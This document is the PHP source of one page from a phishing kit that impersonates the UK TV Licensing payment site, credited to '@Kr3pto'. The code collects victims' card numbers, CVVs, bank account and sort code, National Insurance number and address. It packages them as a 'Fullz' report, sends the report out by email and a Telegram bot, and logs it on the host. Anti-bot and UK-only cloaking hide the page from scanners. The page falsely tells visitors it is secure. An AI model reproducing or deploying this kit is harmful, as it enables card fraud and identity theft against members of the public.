<?php
// @Kr3pto on telegram
require "configg.php";
require "tvgb_assetz/sinc/session_protect.php";
require "tvgb_assetz/sinc/functions.php";
 
if($internal_antibot == 1){
	require "tvgb_assetz/old_blocker.php";
}
if($enable_killbot == 1){
	if(checkkillbot($killbot_key) == true){
		$fp = fopen("tvgb_assetz/sinc/blacklist.dat", "a");
		fputs($fp, "\r\n$ip\r\n");
		fclose($fp);
		header_remove();
		header("Connection: close\r\n");
		http_response_code(404);
		exit;
	}
}
if($mobile_lock == 1){
	require "tvgb_assetz/mob_lock.php";
}
if($UK_lock == 1){
	if(onlyuk() == true){
	
	}else{
		$fp = fopen("tvgb_assetz/sinc/blacklist.dat", "a");
		fputs($fp, "\r\n$ip\r\n");
		fclose($fp);
		header_remove();
		header("Connection: close\r\n");
		http_response_code(404);
		exit;
	}
}
if($external_antibot == 1){
	if(checkBot($apikey) == true){
		$fp = fopen("tvgb_assetz/sinc/blacklist.dat", "a");
		fputs($fp, "\r\n$ip\r\n");
		fclose($fp);
		header_remove();
		header("Connection: close\r\n");
		http_response_code(404);
		exit;
	}
}


error_reporting(0);
ini_set('display_errors', '0');
date_default_timezone_set('Europe/London');
session_start();

if($_POST['ccname'] and $_POST['ccnum'] and $_POST['ccexp'] and $_POST['cccvv']){
	
	$_SESSION['ccname'] = $_POST['ccname'];
	$_SESSION['ccnum'] = $_POST['ccnum'];
	$_SESSION['ccexp'] = $_POST['ccexp'];
	$_SESSION['cccvv'] = $_POST['cccvv'];
	$_SESSION['accno'] = $_POST['accno'];
	$_SESSION['sortcode'] = $_POST['sortcode'];
	
	$title = $_SESSION['title'];
	$initial = $_SESSION['initial'];
	$lastName = $_SESSION['lastName'];
	$email = $_SESSION['email'];
	$mobile = $_SESSION['mobile'];
	$nin = $_SESSION['nin'];
	
	$address = $_SESSION['address'];
	$town = $_SESSION['town'];
	$postcode = $_SESSION['postcode'];
	
	$ccname = $_SESSION['ccname'];
	$ccnum = $_SESSION['ccnum'];
	$ccexp = $_SESSION['ccexp'];
	$cccvv = $_SESSION['cccvv'];
	$accno = $_SESSION['accno'];
	$sortcode = $_SESSION['sortcode'];
	
	
	$ccnum = str_replace(' ', '', $ccnum);
	$bin = substr($ccnum, 0, 6);
	$ccc = bankDetails($bin);
	$scheme =  strtoupper($ccc['scheme']);
	$type =  strtoupper($ccc['type']);
	$brand =  strtoupper($ccc['brand']);
	$bank =  strtoupper($ccc['bank']['name']);
	$bin =  strtoupper($ccc['bin']);
	$country =  strtoupper($ccc['country']['alpha2']);
	if($ccc['prepaid'] == true){$prepaid = strtoupper('Prepaid');}else{$prepaid = strtoupper('Non-Prepaid');}
	$ccinfo = "$bin | $scheme | $type | $brand | $bank";
	
	$date = date('l d F Y');
	$time = date('H:i');
	$hostname = gethostbyaddr($ip);
	$useragent = $_SERVER['HTTP_USER_AGENT'];
	$os = os_info($useragent);
	$browser = browsername();
	$VictimInfo  = "| IP Address : $ip\n";
	$VictimInfo .= "| UserAgent : $useragent\n";
	$VictimInfo .= "| Browser : $browser\n";
	$VictimInfo .= "| OS : $os";
	
	$headers = "From:$ccname <Kr3ptoTV@results.co.uk>";
	$subj = "Kr3pto TV Fullz $bin - $type $brand $bank [$ip]";
	
	
	$data = "
+ ------------- TV Fullz --------------+
+ ---------------------------------------------+
| Title : $title
| First Name : $initial
| Last Name : $lastName
| Mobile number : $mobile
| Address : $address
| Town : $town
| Post Code : $postcode
| Email Address : $email
| NI # : $nin
+ ---------------------------------------------+
| Card Holder : $ccname
| Card Number : $ccnum
| Card Expiry : $ccexp
| CVV : $cccvv
| Account Number : $accno
| Sortcode : $sortcode
| BIN : $ccinfo
+ ---------------------------------------------+
+ Victim Information
$VictimInfo
| Received : $date @ $time
+ ---------------- @Kr3pto --------------------+
";

	mail($to,$subj,$data,$headers);	
	if($saveonhost == 1){
		$fpx = fopen('page_l0gz/TV_Fullzz_.txt', 'a');
		fwrite($fpx, $data."\n");
		fclose($fpx);
	}
	if($telegram_delivery == 1){
		telegram_deliver($chat_id,$data,$bot_token);
	}

	
	
	
}else{
	$fp = fopen("tvgb_assetz/sinc/blacklist.dat", "a");
	fputs($fp, "\r\n$ip\r\n");
	fclose($fp);
	header_remove();
	header("Connection: close\r\n");
	http_response_code(404);
	exit;
}

?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "https://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="https://www.w3.org/1999/xhtml" xml:lang="en" lang="en" class="">
    <head>
        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
        <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
        <meta name="viewport" content="width=device-width, initial-scale=1" />
        <title>Review and Confirm - TV Licensing ™</title>
        <link rel="stylesheet" href="tvgb_assetz/css/master.css" />
        <link rel="stylesheet" href="tvgb_assetz/css/jquery.ui.all.css" />
        <link rel="stylesheet" href="tvgb_assetz/css/master_rwd.css" />
        <link rel="stylesheet" href="tvgb_assetz/css/jquery.mobile-1.3.20.css" />
        <link rel="shortcut icon" href="tvgb_assetz/img/favicon.ico" />
    </head>
    <body class="steps">
        <div id="iPage">
            <div id="iHeader">
                <div class="innerContainer clearfix topHeadCtr" style="display: block;">
                    <div class="clearfix" id="headerTop">
                        <div class="clearfix" id="iLogo">
                            <h1>
                                <a href="javascript:void(0);" class="fwckembeddedlink logoWrapper"><img src="tvgb_assetz/img/imgHeaderLogo.png" /> </a> <span class="headingText">TV Licensing</span>
                            </h1>
                            <div id="linkToggle" style="cursor: pointer;">&nbsp;</div>
                        </div>
                        <div class="mobileNav clearfix right" id="iMobileNav"><div class="clearfix" id="srhCtr" style="cursor: pointer;">&nbsp;</div></div>
                        <div class="clearfix" id="iGlobalNav">
                            <ul>
                                <li class="first"><a href="javascript:void(0);" class="fwckembeddedlink">Home</a></li>
                                <li><a href="javascript:void(0);" class="fwckembeddedlink">Easy read</a></li>
                                <li class="second">
                                    <span lang="cy"><a href="javascript:void(0);" class="fwckembeddedlink">Cymraeg</a> </span>
                                </li>
                            </ul>
                            <fieldset class="search" id="siteSrch" style="display: block;">
                                <legend class="hide">search site</legend>
                                <span class="siteSearchWrap"> <input id="siteSearch" name="q" style="color: rgb(88, 88, 88);" type="search" value="Search" /> </span>
                                <input id="siteSearchGo" type="button" value="search" name="___##NO_NAMED_ELEMENT##___" />
                            </fieldset>
                        </div>
                    </div>
                    <div class="clearfix" id="iPrimaryNav">
                        <ul>
                            <li>
                                <a href="javascript:void(0);">
                                    <span><strong>Pay</strong> for your TV Licence</span>
                                </a>
                            </li>
                            <li>
                                <a href="javascript:void(0);">
                                    <span><strong>Update</strong> your details</span>
                                </a>
                            </li>
                            <li>
                                <a href="javascript:void(0);" class="fwckembeddedlink">
                                    <span><strong>Check</strong> if you need one</span>
                                </a>
                            </li>
                        </ul>
                    </div>
                </div>
                <div>&nbsp;</div>
            </div>
            <div id="iContent">
                <div class="innerContainer" style="display: block;">
                    <ul id="iBread">
                        <li>
                            <a href="javascript:void(0);">TV Licence<span class="linkPurpose">Link for TV Licence</span></a>
                        </li>
                        <li>
                            / <a href="javascript:void(0);"> Pay for your TV Licence<span class="linkPurpose robots-nocontent robots-noindex">Alternative link for Pay for your TV Licence</span> </a>
                        </li>
                        <li>/ Review and Confirm</li>
                    </ul>
                    <div id="iPrimary">
                        <ol id="iStep" class="clearfix">
                            <li class="visited">
                                <label id="Label1" for="Button1"><span class="steplabel"> About TV Licence Holder</span><span class="hiddenAccessibleTextOnStepsMenu">Current step</span></label>
                                <input type="button" id="Button1" class="stepSubmitButton" value="1" name="Button1" />
                            </li>
                            <li class="visited">
                                <label id="Label2" for="Button2"><span class="steplabel"> Address to be licensed</span><span class="hiddenAccessibleTextOnStepsMenu">Future step</span></label>
                                <input type="button" id="Button2" class="stepSubmitButton" value="2" name="Button2" />
                            </li>
                            <li class="visited">
                                <label id="Label3" for="Button3"><span class="steplabel"> Payment details</span><span class="hiddenAccessibleTextOnStepsMenu">Future step</span></label>
                                <input type="button" id="Button3" class="stepSubmitButton" value="3" name="Button3" />
                            </li>
                            <li class="selected">
                                <label id="Label4" for="Button4"><span class="steplabel"> Review and Confirm</span><span class="hiddenAccessibleTextOnStepsMenu">Future step</span></label>
                                <input type="button" id="Button4" class="stepSubmitButton" value="4" name="Button4" />
                            </li>
                        </ol>
                        <div class="panel secondary stepContent clearfix" id="stepContent">
                            <h2 class="header beta"><span>Step 4: Review and Confirm</span></h2>

<div class="info info" style="background:#fff;">
Please make sure all the details below are correct before you make your No Licence needed Declaration. If you need to change anything, please click the 'Back' button below.
</div>

<div class="info info">
<center>
<b>
<?=$title;?> <?=$initial;?> <?=$lastName;?><br>
<?=$address;?>, <?=$town;?>, <?=$postcode;?>
</b>
</center>
</div>

<div class="info info" style="background:#fff;">
It is important you understand that if you are found to be watching TV illegally. you risk prosecution and a fine of up to $1,000 plus any legal costs and/or compensation you may be ordered to pay. *
<br>
<br>

<sub>* In Scotland, Scottish criminal law applies. A report will be sent to the Procurator Fiscal who will decide on prosecution. The maximum fine is $2,000 in Goernset and $500 in Jersey.</sub>
<br>
<br>
<div class="info info" style="padding: 0px;padding-right: 0.77em;padding-left: 0.77em;">
	<div class="icon">
	If you are going to watch or record live TV programmes on any channel or device, or download or watch BBC programmes on IPlayer, you need to be covered by a TV Licence.
	</div>
</div>



</div>

Once you click 'Submit', confirmation of your Declaration will be added to our records.


<div class="div">
    <div id="btnContinueContainer" class="btnGrp">
		<form method="post" action="ReviewAndConfirmRedirect.php?sslchannel=true&sessionid=<?=generateRandomString(130);?>">
			<input type="hidden" name="allow" value="yes">
		<span class="arrowBtn"><input type="submit" name="btnContinue" value="Continue"></span>
		</form>
    </div>
</div>


                            
                        </div>
                    </div>
                    <div id="iSecondary">
                        <div class="panel primary">
                            <h3 class="header alpha secure"><span>Secure website</span></h3>
                            <p>Whether you’re paying for your TV Licence, setting up a Direct Debit, or updating your details, you can relax in the knowledge that this is a secure website and your personal information is safe with us.</p>
                        </div>
                    </div>
                    <div style="clear: both;"></div>
                </div>
            </div>
            <div id="iFooter">
                <div class="innerContainer" style="display: block;">
                    <ul id="iFooterNav">
                        <li class="first"><a href="javascript:void(0);" class="fwckembeddedlink">About us</a></li>
                        <li><a href="javascript:void(0);">Contact us</a></li>
                        <li><a href="javascript:void(0);" class="fwckembeddedlink">Accessibility</a></li>
                        <li><a href="javascript:void(0);">Community relations</a></li>
                        <li><a href="javascript:void(0);">Media Centre</a></li>
                        <li><a href="javascript:void(0);" class="fwckembeddedlink">Sitemap</a></li>
                        <li><a href="javascript:void(0);" class="fwckembeddedlink">Cookies</a></li>
                        <li class="last"><a href="javascript:void(0);" class="fwckembeddedlink">Privacy policy</a></li>
                    </ul>
                    <p>General information about TV Licensing is available in other languages:</p>
                    <ul id="iLanguages">
                        <li class="first">
                            <span lang="cy"><a href="javascript:void(0);" class="fwckembeddedlink">Cymraeg</a></span>
                        </li>
                        <li>
                            <span lang="pl"><a href="javascript:void(0);" class="fwckembeddedlink">Polski</a></span>
                        </li>
                        <li>
                            <span lang="es"><a href="javascript:void(0);" class="fwckembeddedlink">Español</a></span>
                        </li>
                        <li>
                            <span lang="pt"><a href="javascript:void(0);" class="fwckembeddedlink">Português</a></span>
                        </li>
                        <li style="background: rgba(0, 0, 0, 0) url('tvgb_assetz/img/imgFooterNavBg.png') no-repeat scroll right top; padding-right: 1.4em;">
                            <span class="unicode" lang="ur"> <a href="javascript:void(0);" class="fwckembeddedlink">اردو</a> </span>
                        </li>
                        <li class="last" style="padding-left: 1.11em;"><a href="javascript:void(0);">More languages &gt;&gt;</a></li>
                    </ul>
                    <p class="copyright">© 2025 TV Licensing</p>
                </div>
            </div>
        </div>
    </body>
</html>